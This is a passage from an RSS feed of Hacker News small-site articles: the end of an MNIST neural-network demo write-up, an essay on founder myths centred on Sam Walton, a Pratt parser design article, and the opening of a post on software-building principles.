        The training was run for 230 epochs on the 60,000 training examples using 500 sized mini-batches randomized before each epoch.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/diagram.svg">
        <p> 
            The structure of the network
        </p>
    

    <p>
        After each epoch the performance of the network was measured against the 10,000 test examples from the dataset.
        The tests were showing promising results very early on. From the initial state, where the network answered 8.92% of the tested
        examples right (a mere random guess would result in a ~10% success rate), after 4 epochs it surpassed the 50% mark. 80% was reached
        in the 17th epoch, and 90% in the 79th epoch. After 230 epochs the training finished at a success rate of ~92.5%.
    </p>
    
    <p>
        Here you can try out the result of the network. Draw a number using your mouse or your touchscreen and press the 'What did I draw?' button!
    </p>

    <div>
        <canvas id="drawCanvasSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvas" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResult">Draw a number from 0 to 9!</p>
    </div>

    <p>
        It doesn't really work! Seeing a more than 90% success rate caused high expectations, but after trying some of my own drawings on the network
        it became apparent that the network is failing to recognize hand written digits.
        Around 3 out of 10 of my attempts were successful and that is very far from 90%.
    </p>
    
    <p>
        So what is going on here? To gain a better understanding of why the network fails to recognize our 
        own drawings let's try to visualize the neurons during training in a way that makes sense of the data and
        see if we can find out whats happening!
    </p>
    
    <p>
        On the next video, you can follow trough the learning process epoch by epoch.
        
        In the Hidden layer section you can see the 64 neurons of the Hidden layer in a 8x8 arrangement.
        Each neuron is a 28x28 grid, showing red pixels for positive weights, and blue pixels for negative weights
        as they connect to the Input layer (that is essentially the input image). 
        The bias (or negative threshold) is also visible as a vertical bar on the right side of the weights.
        Yellow is for positive biases and green is for negative ones.
        The Output layer consists of 10 neurons, each having 8x8 weights connecting to each of the neurons in
        the Hidden layer.
    </p>

    <video controls="">
        <!-- <source src="assets/learning.av1.mp4" type="video/mp4; codecs=av01"/> -->
        <source src="https://zbendefy.github.io/neuralnet-web/assets/learning.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>
    
    <p>
        As the network is learning you can see some curly patterns emerging from the initial random noise. Those patterns are the common
        parts of numeric digits that the network generalized to. Looking at this image, it seems like each neuron in the Hidden layer is sort of like a function
        in a programming language, meaning that a following layer (in this case the Output layer) can use the Hidden
        layer's neurons as if they were functions implementing some abstracted behavior. By adjusting a weight in one of
        the the Output layer's neurons, it can selectively discard or use the result of the corresponding 'function' in the Hidden layer.
        This is a very powerful way to process things. Imagine having a programming language, where you are not allowed to use any functions:
        you would have to copy-paste a lot of code around meaning that you'd use up a lot more space due to the more instructions.
        Using multiple layers in a network therefore allows us to use way less total neurons to achieve similiar results.
    </p>
    
    <p>
        The patterns that have emerged in the Hidden layer are quite interesting. As we discussed they are probably some
        generalization of hand-drawn numbers, an efficient, compact way of differentiating from one digit to an other.
        Looking at them closely reveals some interesting property though: they seem to be noticably centered inside 
        the 28x28 pixel sized region. Could this mean that the MNIST data was somehow pre-processed? 
        The MNIST dataset's description reveals that in fact this is the case:
    </p>

    <div>
        <p>
            ❞
        </p>
        <p>
            The images were centered in a 28x28 image by computing the center of mass of the pixels, and translating the image so as to position this point at the center of the 28x28 field.
        </p>
    </div>

    <p>
        That's the issue! The previous drawing applet didn't actually take that into consideration, and as the network only ever encountered
        images that were previously centered, it only learned to recognize those.
        The solution now seems simple: Calculate the center of mass for the image that is drawn, and translate the image so that it is in 
        the middle of the 28x28 region.
        This fixes the issue entirely, providing a network that can actually recognize digits. Try out the fixed version here:
    </p>

    <div>
        <canvas id="drawCanvasCorrectedSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvasCorrected" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResultCorrected">Draw a number from 0 to 9!</p>
        
    </div>

    <p>
        We could also randomly translate the input images and train the network on that, but that is an unnecessarily harder
        problem for a network to solve. A conventional algorithm is perfectly suitable for this task. 
        Additionally the translation might not be enough, for even better results we should fit the size of the drawing
        to the 28x28 pixel grid.
    </p>
    
    <p>
        One other interesting insight that we can gain from this visualization, is that the 64 neurons of the Hidden layer are
        in fact more than what the network needs. Pause the video at the end of the learning process, and you'll see that out of
        the 64 neurons in the Hidden layer, around 12 of them are noticably dimmer than the rest. It seems like that 
        these neurons have very little impact on the final result, and their values are not that important.
        If you focus on the top-left neuron on the 8x8 grid, you can see that not only it is very dim, but also 
        none the Output layer's 10 neurons reference that top-left neuron with a high enough weight to matter, meaning that it is a 
        mostly redundant. This is a direct hint that we could reduce the neuron count in the Hidden layer to speed up
        learning.
    </p>
    
    

    <p>
        Thanks for reading. If you would like to experiment with this network, you can download it in JSON format by <a href="https://zbendefy.github.io/neuralnet-web/network_000230.json">clicking here</a>.
        Also you can check out my C# Neural Network library called <a href="https://github.com/zbendefy/machine.academy">machine.academy</a>, featuring GPU acceleration.
    </p>
    
    <p>
        The SVG image of the network's structure was made using <a href="http://alexlenail.me/NN-SVG/LeNet.html">this</a> awesome tool available online.
    </p>

    
    
    <a href="https://github.com/zbendefy/neuralnet-web">
        <img src="https://zbendefy.github.io/neuralnet-web/assets/githublogo.png">
        
    </a>








</div>]]>
            </description>
            <link>https://zbendefy.github.io/neuralnet-web/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513373</guid>
            <pubDate>Fri, 18 Sep 2020 05:50:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ignore every founder’s story on how they started their company]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513310">thread link</a>) | @trevmckendrick
<br/>
September 17, 2020 | https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company | <a href="https://web.archive.org/web/*/https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>By Trevor McKendrick 👋 - Have you <a href="https://www.trevormckendrick.com/newsletter" target="_blank">read my free newsletter</a>?<br>‍</p></div><div><div><h3>Founding Stories Are Myths</h3><p>Company founding stories are almost always non-malicious lies. Take the image above of Reed Hastings @ Netflix....</p><p>Reed Hastings has <a href="https://www.vanityfair.com/news/2013/02/07-reed-hastings">said</a> <a href="http://archive.fortune.com/2009/01/27/news/newsmakers/hastings_netflix.fortune/index.html">many</a> <a href="https://twitter.com/netflix/status/2746816142?lang=en">times</a> <a href="https://www.wired.com/2002/12/netflix-6/">that</a> <a href="http://www.evancarmichael.com/library/reed-hastings/Reed-Hastings-Quotes.html">he got the</a> <a href="https://www.hollywoodreporter.com/news/reed-hastings-innovator-year-81514">idea</a> for Netflix because he once was charged a $40 late fee on Apollo 13.</p><p>That didn’t actually happen. </p><p>It’s unfortunate because it will inevitably mislead anyone learning how to start a company. </p><h3>Sam Walton's Overnight Success</h3><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e70c3fecf07561da8e7_grand_opening.jpeg" alt=""></p></figure><p>Sam was already 44(!) when he opened the first Walmart and had been running his own retail stores for over 15 years.</p><p>He wondered why people focused on the beginning of Walmart: </p><p><strong>Somehow over the years folks have gotten the impression that Walmart was something I dreamed up out of the blue as a middle-aged man, and that it was just this great idea that turned into an overnight success… </strong></p><p><strong>Like most overnight successes, it was about 20 years in the making.</strong></p><p>If you’re trying to build your own thing &amp; you want to learn from “the founder of Walmart”, looking at the start of the company itself is stupid because at that point he already had 15 years of experience</p><p>So let’s start with Sam’s very first store.</p><h3>The Biggest Mistake of&nbsp;Sam's Professional Life</h3><p>Sam started his retail career at 27 buying his 1st store, a “Ben Franklin” variety store franchise. </p><p>As a beginner he relied on the franchise’s playbook but also incorporated his own experiments. </p><p>Things like:</p><ul role="list"><li>putting popcorn &amp; ice cream machines in front of the store to drive traffic</li><li>doing huge discounts but actually making it up in volume (i.e. not ironically)</li><li>buying directly from manufactures instead of going through the franchise (which allowed for cheaper prices)</li></ul><p>He worked hard on that single store for 5 years, grew sales 3.5x to $250k/year and became the #1 Ben Franklin franchisee in his six-state region.</p><p>But then he found out he’d made a gigantic mistake.</p><p><strong><em>When he signed the store lease he didn’t include an option to renew it.</em></strong></p><p>The owner (a local department store competitor) saw his success &amp; refused to renew the lease at any price, thereby forcing Sam to shut down the store.</p><p>Imagine working on something for 5 years straight, becoming the best at it, and then having a single person end it all.</p><p>Sam was devastated:</p><p><strong><em>It was the lowpoint of my business life. I felt sick to my stomach. I couldn’t believe it was happening to me… I had built the best variety store in the whole region and worked hard in the community – done everything right – and now I was being kicked out of town. It didn’t seem fair. I blamed myself for ever getting suckered into such an awful lease, and I was furious at the landlord.</em></strong></p><p>He was mad, but he accepted responsibility:</p><p><strong><em>I’ve always thought of problems as challenges, and this one wasn’t any different… I had to pick myself up and get on with it, do it all over again, only even better this time.</em></strong></p><p>If Facebook or Google change their algorithms you at least get to keep your old customer base and your business assets.</p><p>But with a retail store you have none of that. </p><p>And because of the structure of the town they couldn’t just open another store somewhere nearby.</p><p>The Waltons literally had to pack up their family of 6 and go find a new town.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7090bddf371b5d9227_shadow_figures.jpeg" alt=""></p></figure><p>If he’d wanted to Sam had plenty of reasons to sulk: they were starting all over in a <em>smaller</em> town (Bentonville) that also had its fair share of competition (3 other variety stores). </p><p><strong>But Sam said “it didn’t matter much because I had big plans.”</strong></p><h3>Unsexy Determination</h3><p>Sam spent the next 12 years in what I call <em>narrative limbo</em>.</p><p>It’s the crucial part of any “overnight success” that doesn’t get covered in the Successful Entrepreneur genre.</p><p>No one writes about all the random tangents and mistakes you make here.</p><p>Like, say, that time Sam tried to start a shopping mall 10 years too early and lost $25,000? </p><p>Or what about the time a tornado destroyed his best performing store? All he had to say was “we just rebuilt it and got back at it.”</p><p>This is important to know if you’re trying to learn from Sam, but it doesn’t fit into any narrative.</p><p>The lesson here is that there will be mistakes and problems on any path to success. As a recent book title says, <a href="https://www.amazon.com/dp/B00G3L1B8K/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">those obstacles are the way itself.</a></p><p>A coworker said Sam excelled here because he woke up every day “determined to improve something”, and that he was</p><p><strong><em>less afraid of being wrong than anyone I’ve ever known…Once he sees he’s wrong, he just shakes it off and heads in another direction.</em></strong></p><p>You don’t get any of this from Reed Hastings when he talks about $40 late fees. You think “oh I need a great idea” when the reality is the idea is nothing and your psychology &amp; persistence is everything.</p><p>Eventually Sam got to 15 stores &amp; by 1960 was the largest independent variety store operator in the US, doing a a total of ~$12M (in 2018 dollars) in annual revenue.</p><h3>It Would Seem Obvious</h3><p>It was here that Sam finally saw the opportunity for much bigger discount stores and got to work on the 1st Walmart.</p><p>He was the most successful independent operator in the US &amp; had 15 years of experience in retail, surely it should have been easy for him to raise money from investors…?</p><p>Wrong.</p><p>Sam asked other store owners, entrepreneurs, competitors… basically everyone said no.</p><p>He got a measly 5% from his own brother &amp; a store manager and had to borrow the other 95% (signing their house and all their other stores as collateral).</p><p><strong><em>Even the great Sam Walton couldn’t find investors to start the 1st Walmart, on the back of a near-perfect record in retail.</em></strong></p><h3>The 1st Wal-Mart</h3><p>Finally, the point where most people look at to learn, is the end of our story.</p><p>The 1st Walmart was an ugly retail store (8-foot ceilings, concrete floor, wooden fixtures) but it worked because Walmart’s prices always beat competitors. </p><p>(Even the name “Walmart” was selected with customer prices in mind: it was cheaper to buy neon signs for 7 letters than the longer names Sam considered.)</p><p>And you think Sam cared 2 cents about what anyone else thought about his stores? </p><p>The New York Times doesn’t mention Sam or Walmart until 1969, 7 years after the 1st store opening, and he’s just one random quote in the back of the paper:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7098a06f34c1f02247_south.png" alt=""></p></figure><p>And the Walmart 1970 IPO got a <em>single</em> mention on page 44 of the Times:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7072644e0be8fffc12_nyt_walton.png" alt=""></p></figure><p>If you want to learn from entrepreneurs, look at the start not the finish.</p><p>This first appeared in my weekly newsletter <em>How It Actually Works</em>. <a href="https://www.howitactuallyworks.com/">Sign up to receive it here.</a></p></div></div></div>]]>
            </description>
            <link>https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513310</guid>
            <pubDate>Fri, 18 Sep 2020 05:32:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making a Pratt Parser Generator]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24513092">thread link</a>) | @todsacerdoti
<br/>
September 17, 2020 | https://www.robertjacobson.dev/designing-a-pratt-parser-generator | <a href="https://web.archive.org/web/*/https://www.robertjacobson.dev/designing-a-pratt-parser-generator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main" role="main">
    <div>

        <article>

            

            
            <figure>
            </figure>
            

            <section>
                <div>
                    <h2 id="a-brief-history-of-the-pratt-parsing-algorithm">A brief history of the Pratt parsing algorithm</h2>
<p>The history of programming language parsers is dominated by the thorny challenge of parsing expressions, mathematical expressions in particular, taking into account the pecedence of operators in the expressions. Modern formal language theory began with the work of Noam Chomsky in the 1950s, in which Chomsky lays out a mathematical framework for linguistics. Under this mathematical framework, languages exist within a heirarchy of langauges defined according to how difficult the language is to parse.<sup id="fnref:1"><a href="#fn:1">1</a></sup> But computer programmers needed practical, efficient algorithms to parse computer programs for translation to machine code. Parsers of the 1950s relied on ad hoc logic rather than systematic algorithms (a feature which persists to this day, though to a much lesser degree). The 1960s was a golden age of parsing algorithm research when nearly all of the concepts and algorithms we use today were discovered and rigorously studied. By the early 1970s, parsing theory had evolved to the point that  Stephen C. Johnson, a computer scientist at Bell Labs / AT&amp;T, was able to start work on YACC (now “Yacc”), “Yet Another Compiler Compiler.”<sup id="fnref:2"><a href="#fn:2">2</a></sup> YACC was first publically described in 1975 and shipped with Unix version 3<sup id="fnref:3"><a href="#fn:3">3</a></sup>  and is still in use today.</p>

<p>The thorny challenge of parsing expressions was partially solved in 1961 by the venerable shunting-yard algorithm described by Dutch computer scientist Edsger W. Dijkstra, which algorithm could efficiently parse binary infix operator expressions with a value stack and an operator stack, creating nodes from the bottom up. Vaughan R. Pratt generalized Dijkstra’s sunting-yard algorithm to parsing of entire languages, this time using a single stack, or using recursive descent with the call stack as an implicit stack, creating nodes from the top down. Pratt’s parsing algorithm overcomes a number of limitations with the shunting-yard algorithm and is simpler.</p>

<p>Precedence climbing was apparently first invented by Martin Richards in 1979<sup id="fnref:4"><a href="#fn:4">4</a></sup> for his BCPL compiler. Precedence climbing uses a single recursive function and a single table mapping token IDs to their precedence instead of Pratt’s mutual recursive descent and multiple tables. In fact, precedence climbing can be seen as a special case of Pratt parsing, though historically they have been understood as related but not identical.<sup id="fnref:5"><a href="#fn:5">5</a></sup><sup>,</sup><sup id="fnref:6"><a href="#fn:6">6</a></sup></p>

<p>Vaughan Pratt had described his algorithm six years earlier in 1973 at the very first meeting of POPL, the Symposium on Principles of Programming Languages, which remains among the most important conferences in the field. It is interesting to see what other papers are published in the 1973 POPL Proceedings. One finds, for example, Aho, S. C. Johnson, and J. D. Ullman’s “Deterministic parsing of ambiguous grammars,“<sup id="fnref:8"><a href="#fn:8">7</a></sup> and James H. Morris, Jr.’s “Types are not sets,”<sup id="fnref:9"><a href="#fn:9">8</a></sup> among papers by several other influential luminaries. Vaughan Pratt had been developing an alternative expression syntax for MACLISP called CGOL,<sup id="fnref:10"><a href="#fn:10">9</a></sup> which he needed to parse.</p>

<h2 id="parser-design">Parser design</h2>

<h3 id="the-typical-design">The typical design</h3>

<p>There are already many articles on the web describing the Pratt parsing algorithm. (I recommend <sup id="fnref:5:1"><a href="#fn:5">5</a></sup>.) If you are not familiar with the algorithm, go read up on it before returning here.</p>

<p>A typical object oriented design is to have a node class for each kind of AST node, each class implementing their own “parselet” method, traditionally named <code>led</code>  for “left donation” after Pratt’s original article, that is called by a driver algorithm and is responsible for parsing the node instance’s operands (children) by calling back into the driver before returning. Each class also keeps track of its associativity and precedence. The driver algorithm consumes a token, looks up the appropriate class in a table, creates an instance and calls its parslet method.</p>

<p>We can be a little bit more efficient by having only a handful of superclasses corresponding to each required (affix, associativity) combination. In the typical object-oriented Pratt-parser design, every operator would need a subclass of the form</p>

<div><div><pre><code><span>class</span> <span>Multiply</span><span>:</span> <span>public</span> <span>InfixLeftAssoc</span><span>{</span>
  <span>Multiply</span><span>(</span><span>Parser</span> <span>parser</span><span>,</span> <span>ASTNode</span> <span>left</span><span>,</span> <span>Token</span> <span>operator</span><span>)</span><span>:</span> 
  	<span>precedence</span><span>(</span><span>40</span><span>){</span>
		<span>super</span><span>(</span><span>parser</span><span>,</span> <span>left</span><span>,</span> <span>operator</span><span>);</span>
  <span>}</span>
  
  <span>T</span> <span>MultiplyMethodA</span><span>(</span><span>U</span> <span>param1</span><span>,</span> <span>V</span> <span>param2</span><span>){...}</span>
  <span>W</span> <span>MultiplyMethodB</span><span>(</span><span>X</span> <span>param1</span><span>,</span> <span>Y</span> <span>param2</span><span>){...}</span>
  <span>// etc.
</span><span>}</span>
</code></pre></div></div>

<p>This class establishes the Multiply operator as an infix, left associative operator. We have also initialized our operator precedence to 40. Again, the <code>InfixLeftAssoc</code> superclass and other ancestor classes compute left and right binding power (LBP and RBP) from the value of precedence and associativity and implement the <code>led</code> method (“left donation” parselette method) and any utility methods and members. This concrete subclass serves the following purposes:</p>

<ol>
  <li>encodes the affix (by specifying its superclass)</li>
  <li>encodes the associativity  (by specifying its superclass)</li>
  <li>records the precedence</li>
  <li>provides a home for <code>MultiplyMethodA</code> and <code>MultiplyMethodB</code></li>
</ol>

<p>But why are we using different classes at all? This OOP design has several flaws:</p>

<ul>
  <li>It violates the principle of separation of concerns: Why are AST nodes doing the work of the parser?</li>
  <li>It violates the DRY Principle: Unless you autogenerate the code, you need to write a class for every operator—even if you relegate the parslet code to a handful of superclasses.</li>
  <li>This parser design is littered with static data: operator tokens, constants for precedence, associativity, affix, and token IDs, all of which is redundant, as it exists in a table used by the driver algorithm anyway. (Ironically, it is precisely because of its object-oriented design that the code and the data it acts upon are so disparate. This is not entirely the fault of OOP per se but rather of a poor choice of what concepts should be materialized as objects.)</li>
  <li>Generalizing the previous point: This design fixes the language at compile time. If you want to change the precedence of an operator, you need to rewrite, recompile, and redeploy the parser.</li>
  <li>It is cumbersome to write an operator table statically: Unless the code is automatically generated, writing “<code>parser.registeroperator(op, prec, assoc, whatever)</code>,” the code that line depends on, and every subclass for every single operator is a bummer. Even if you autogenerate code, you have to write a code generator.</li>
</ul>

<p>❝The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place.❞</p>

<p>The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place. <em>In principle</em>, if code can automatically be generated, it can also be automatically compiled and executed. So maybe the (hypothetical) generate-compile-run pipeline (usually called a JIT or jitter) can be refactored to eliminate the compile step. In our case, instead of writing a bespoke Pratt parser in which the operator table is both encoded in the class hierarchy and generated again at runtime, why not write a generic Pratt parser that reads in the operator database at startup? As a bonus, modifying the language does not require a recompile: You can add, remove, or modify operators at <em>runtime</em> if you’d like, and maintaining the expression grammar is as simple as editing a value in a spreadsheet. (Indeed, it could be literally that!)</p>

<h3 id="operator-database">Operator Database</h3>

<p>As a toy example, we might have an operator database as follows.</p>

<table>
  <thead>
    <tr>
      <th>TokenID</th>
      <th>Operator</th>
      <th>NameString</th>
      <th>Precedence</th>
      <th>Associativity</th>
      <th>Affix</th>
      <th>Arity</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td><code>"123"</code></td>
      <td><code>"Number"</code></td>
      <td>0</td>
      <td>None</td>
      <td>Null</td>
      <td>Nullary</td>
    </tr>
    <tr>
      <td>2</td>
      <td><code>"^"</code></td>
      <td><code>"Power"</code></td>
      <td>10</td>
      <td>Right</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>3</td>
      <td><code>"*"</code></td>
      <td><code>"Times"</code></td>
      <td>20</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>4</td>
      <td><code>"/"</code></td>
      <td><code>"Divide"</code></td>
      <td>20</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>5</td>
      <td><code>"+"</code></td>
      <td><code>"Plus"</code></td>
      <td>30</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>6</td>
      <td><code>"-"</code></td>
      <td><code>"Minus"</code></td>
      <td>30</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
  </tbody>
</table>

<p>The <code>TokenID</code> might be supplied by the lexer/scanner (many Pratt parsers are scanner-less) and will be used as the identifier. <code>Operator</code> and <code>NameString</code> are only used for printing output. The remaining columns are required to compute the left and right binding powers of each operator. In this example language, every operator is either a terminal (number) or a binary infix operator.</p>

<h3 id="more-sophisticated-operators">More Sophisticated Operators</h3>

<p>Suppose we have ternary, mixfix, or matchfix operators. Then we need to modify the operator database to reflect how the operator tokens appear in an expression. A portion of our operator table might now look like this.</p>

<table>
  <thead>
    <tr>
      <th>TokenID</th>
      <th>LToken</th>
      <th>NToken</th>
      <th>OToken</th>
      <th>NameString</th>
      <th>Precedence</th>
      <th>Associativity</th>
      <th>Affix</th>
      <th>Arity</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>10</td>
      <td><code>"("</code></td>
      <td>&nbsp;</td>
      <td><code>")"</code></td>
      <td><code>"Parentheses"</code></td>
      <td>10</td>
      <td>Non</td>
      <td>Matchfix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
    </tr>
    <tr>
      <td>43</td>
      <td><code>"["</code></td>
      <td>&nbsp;</td>
      <td><code>"]"</code></td>
      <td><code>"Index"</code></td>
      <td>30</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>44</td>
      <td>&nbsp;</td>
      <td><code>"!"</code></td>
      <td>&nbsp;</td>
      <td><code>"Factorial"</code></td>
      <td>40</td>
      <td>Left</td>
      <td>Postfix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>46</td>
      <td>&nbsp;</td>
      <td><code>"-"</code></td>
      <td>&nbsp;</td>
      <td><code>"UnaryMinus"</code></td>
      <td>50</td>
      <td>Right</td>
      <td>Prefix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>49</td>
      <td><code>"/"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Divide"</code></td>
      <td>60</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>55</td>
      <td><code>"?"</code></td>
      <td>&nbsp;</td>
      <td><code>":"</code></td>
      <td><code>"IfThenElse"</code></td>
      <td>70</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Ternary</td>
    </tr>
    <tr>
      <td>57</td>
      <td><code>"+"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Plus"</code></td>
      <td>80</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>60</td>
      <td><code>"-"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Minus"</code></td>
      <td>90</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
  </tbody>
</table>

<p>In this design, the database includes which tokens of the operator can take a left operand (<code>LToken</code>), can begin an expression (no left operand, <code>NToken</code>), or are included in some other position (<code>OToken</code>).</p>

<blockquote>
  <p>The <code>LToken</code>, <code>NToken</code>, <code>OToken</code>, <code>Affix</code>, and <code>Arity</code> can all be inferred from a single example usage, for example:
<code>op1 ? op2 : op3</code>
This suggests that there may be a way to generate a parser for an expression language using nothing but examples. Indeed, there is!</p>
</blockquote>

<p>To reiterate the point, this table of operators might live in a plaintext CSV file. At startup—not at compile time—the Pratt parser reads in the operator table. AST nodes know their identity by their <code>TokenID</code> (which is really an operator ID) or string representation and perform identity-specific actions via dynamic dispatch.</p>

<h3 id="dynamic-dispatch">Dynamic Dispatch</h3>

<p>That last sentence should have raised your suspicion. A fundamental benefit of this design, I claim, is that it keeps you from having to write boilerplate for every operator. Are we just shifting the boilerplate from the …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.robertjacobson.dev/designing-a-pratt-parser-generator">https://www.robertjacobson.dev/designing-a-pratt-parser-generator</a></em></p>]]>
            </description>
            <link>https://www.robertjacobson.dev/designing-a-pratt-parser-generator</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513092</guid>
            <pubDate>Fri, 18 Sep 2020 04:46:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Principles for Building Software]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512801">thread link</a>) | @dailymorn
<br/>
September 17, 2020 | http://kevinmahoney.co.uk/articles/my-principles-for-building-software/ | <a href="https://web.archive.org/web/*/http://kevinmahoney.co.uk/articles/my-principles-for-building-software/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting" id="my-principles-for-building-software">
  <div itemprop="articleBody">
    <p><time itemprop="datePublished">17 September 2020</time></p>

<p>These are my personal principles for building software. I hope to frequently update them as my views change. There can be
valid reasons for breaking them (they are <em>principles</em>, not <em>laws</em>), but in general I believe following
them works out well.</p>

<p>Most of them revolve around making the system simpler in some way. It’s
my belief that simpler systems are more reliable, easier and quicker to modify,
and generally easier to work with.</p>

<ul>
  <li><a href="#make-invalid-states-unrepresentable">Make Invalid States Unrepresentable</a></li>
  <li><a href="#data-consistency-makes-systems-simpler">Data Consistency Makes Systems Simpler</a></li>
  <li><a href="#design-data-first">Design “Data First”</a></li>
  <li><a href="#measure-before-you-cut">Measure Before You Cut</a></li>
  <li><a href="#avoid-trading-local-simplicity-for-global-complexity">Avoid Trading Local Simplicity for Global Complexity</a></li>
  <li><a href="#recognise-intrinsic-complexity">Recognise Intrinsic Complexity</a></li>
  <li><a href="#fewer-technologies-result-in-simpler-systems">Fewer Technologies Result in Simpler Systems</a></li>
  <li><a href="#focus-your-learning-on-concepts-not-technologies">Focus Your Learning on Concepts, not Technologies</a></li>
  <li><a href="#code-consistency-is-important">Code Consistency is Important</a></li>
  <li><a href="#shared-principles-are-important">Shared Principles are Important</a></li>
</ul>

<h2 id="make-invalid-states-unrepresentable">Make Invalid States Unrepresentable</h2>

<p>I have put this first because I think it is one of the most important
and most powerful principles.</p>

<p>You may have heard this phrase in relation to designing your program’s types, but
the principle applies everywhere you represent data - for example database design.</p>

<p>Not only does this reduce the number of states
your system can be in (and thus make it simpler), but it reduces the
number of <em>invalid</em> states, which is even better! Your system does not
have to handle these states because they literally cannot be
represented in your program.</p>

<p>This is not just a minor convenience, it can drastically simplify your system and prevent
entire classes of bugs from occurring.</p>

<h2 id="data-consistency-makes-systems-simpler">Data Consistency Makes Systems Simpler</h2>

<p>Consistency enforces rules on your data, and so reduces the number
of states your system needs to handle. This follows on from the
“make invalid states unrepresentable” principle.</p>

<p>I am using consistency here in a very general sense: that your data
adheres to certain rules, and that it always obeys those rules
at every point in time. This definition is related to ACID consistency, and shouldn’t be confused with CAP consistency.</p>

<p>The rules can be any pretty much anything, for example, 
that your credit should never be able to go negative,
or that private posts should not be visible to others.
It is not restricted to foreign keys or unique indexes, although
they are also valid examples.</p>

<p>As well as your database, consistency may be enforced by your
application utilising ACID transactions. It is preferable to enforce
them at the database level, but this is not common practice for
anything more complex than simple checks for practical reasons.</p>

<p>Anything which restricts or compromises consistency results in complexity.
This leads to the following practical advice:</p>

<p>It is simpler to have:</p>
<ul>
  <li>Fewer databases (ideally one)</li>
  <li>Normalised, less redundant data</li>
  <li>A ‘good’ database design (big topic)</li>
  <li>ACID transactions</li>
  <li>More data constraints</li>
</ul>

<p>It is more complex to have:</p>
<ul>
  <li>Multiple databases</li>
  <li>Redundant or denormalised data</li>
  <li>A poor database design</li>
  <li>Fewer (or no) data constraints</li>
</ul>

<p>Of course, there are valid reasons to make your system more complex, and I don’t
intend complexity to be a dirty word, but see <a href="#measure-before-you-cut">“measure before you cut”</a>.</p>

<p>I consider this principle to be one of the most undervalued in
software engineering today. Consistency issues often go unrecognised.
Many problems, I daresay <em>most</em> problems,
are consistency issues at an essential level - data that does
not conform to some expectation.</p>

<p>See <a href="#appendix-a-inconsistency-results-in-complexity">the appendix</a> for an illustration of how inconsistency can cause complexity.</p>

<h2 id="design-data-first">Design “Data First”</h2>

<p>What is more likely to be around in 10 years: your code or your data?</p>

<p>Code can be thrown away and re-written, but this is rarely the case
with data.</p>

<p>Data is more important than code. The only purpose of code is to transform data.</p>

<p>When designing a new system, it’s best to start with your database and
your data structures and build your code on top of that. Consider
the constraints you can place on your data and enforce them, ideally
by the way your represent your data.</p>

<p>Code design flows naturally from data design. The simpler and more
consistent your data model is, the simpler your code will be.</p>

<blockquote>
<p>Show me your flowcharts and conceal your tables,
